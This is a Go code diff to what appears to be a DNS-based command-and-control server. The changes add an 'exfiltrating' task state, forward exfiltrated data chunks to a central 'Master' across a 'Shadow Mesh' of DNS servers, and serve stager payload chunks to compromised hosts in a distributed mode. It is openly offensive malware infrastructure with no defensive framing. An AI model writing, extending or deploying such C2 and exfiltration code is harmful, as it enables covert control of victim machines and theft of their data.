@@ -1002,6 +1002,17 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	c2.mutex.Lock()
 	task, exists := c2.tasks[taskID]
 	if exists {
+		// For single-chunk results, transition: sent → exfiltrating → completed
+		if task.Status == "sent" && !isDuplicate {
+			task.Status = "exfiltrating"
+			if c2.db != nil {
+				go func(tid string) {
+					if err := c2.db.UpdateTaskStatus(tid, "exfiltrating"); err != nil && c2.debug {
+						logf("[C2] Failed to update task status to exfiltrating: %v", err)
+					}
+				}(taskID)
+			}
+		}
 		task.Result = result
 		task.Status = "completed"
 		if c2.debug && !isDuplicate {
@@ -1189,6 +1200,25 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 		return "ACK"
 	}
 
+	// Update task status to "exfiltrating" when first chunk arrives
+	if !isDuplicate && taskExists && task.Status == "sent" {
+		c2.mutex.Lock()
+		if c2.tasks[taskID].Status == "sent" {
+			c2.tasks[taskID].Status = "exfiltrating"
+			if c2.db != nil {
+				go func(tid string) {
+					if err := c2.db.UpdateTaskStatus(tid, "exfiltrating"); err != nil && c2.debug {
+						logf("[C2] Failed to update task status to exfiltrating: %v", err)
+					}
+				}(taskID)
+			}
+			if c2.debug {
+				logf("[DEBUG] Task %s status: sent → exfiltrating", taskID)
+			}
+		}
+		c2.mutex.Unlock()
+	}
+
 	// SHADOW MESH: Forward chunk IMMEDIATELY to Master (don't wait for all chunks)
 	// Master will handle reassembly from chunks received by ALL DNS servers
 	if masterClient != nil {
@@ -1231,6 +1261,7 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 
 // handleStagerRequest processes a stager deployment request
 // Format: STG|IP|OS|ARCH
+// In distributed mode, forwards to Master for coordinated stager deployment
 func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
@@ -1242,6 +1273,31 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 
 	if !isDuplicate {
 		logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
+	}
+
+	// In distributed mode, forward stager init to Master
+	if masterClient != nil {
+		sessionInfo, err := masterClient.InitStagerSession(stagerIP, stagerOS, stagerArch)
+		if err != nil {
+			if !isDuplicate {
+				logf("[C2] Failed to init stager session with Master: %v", err)
+			}
+			return "ERROR|MASTER_UNAVAILABLE"
+		}
+
+		if !isDuplicate {
+			logf("[C2] Stager session created: %s (%d chunks across Shadow Mesh)",
+				sessionInfo.SessionID, sessionInfo.TotalChunks)
+		}
+
+		// Return META response with DNS domains list
+		domainsStr := strings.Join(sessionInfo.DNSDomains, ",")
+		return fmt.Sprintf("META|%d|%s", sessionInfo.TotalChunks, domainsStr)
+	}
+
+	// Standalone mode fallback - use local client binary
+	if !isDuplicate {
+		logf("[C2] Warning: Running in standalone mode, using local client binary")
 	}
 
 	// Determine client binary filename based on OS
@@ -1356,7 +1412,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 }
 
 // handleStagerAck processes a stager acknowledgment for chunk delivery
-// Format: ACK|chunk_index|stager_IP|hostname
+// Format: ACK|chunk_index|stager_IP|session_ID (in distributed mode)
+// Format: ACK|chunk_index|stager_IP|hostname (in standalone mode)
 func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
@@ -1370,9 +1427,29 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 		return "ERROR|INVALID_INDEX"
 	}
 
-	stagerIP := parts[2] // Extract stager's actual IP from ACK message
+	stagerIP := parts[2]  // Extract stager's actual IP from ACK message
+	sessionID := parts[3] // Session ID or hostname
 
-	// Look up the stager session using stager's actual IP (not DNS resolver IP)
+	// In distributed mode, request chunk from Master
+	if masterClient != nil {
+		chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
+		if err != nil {
+			if !isDuplicate {
+				logf("[C2] Failed to get chunk from Master: %v", err)
+			}
+			return "ERROR|CHUNK_UNAVAILABLE"
+		}
+
+		if !isDuplicate {
+			logf("[C2] Serving chunk %d/%d for stager %s (session: %s)",
+				chunkIndex, chunkResp.ChunkIndex, stagerIP, sessionID)
+		}
+
+		// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
+		return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData)
+	}
+
+	// Standalone mode - look up local session
 	c2.mutex.RLock()
 	session, exists := c2.stagerSessions[stagerIP]
 	c2.mutex.RUnlock()
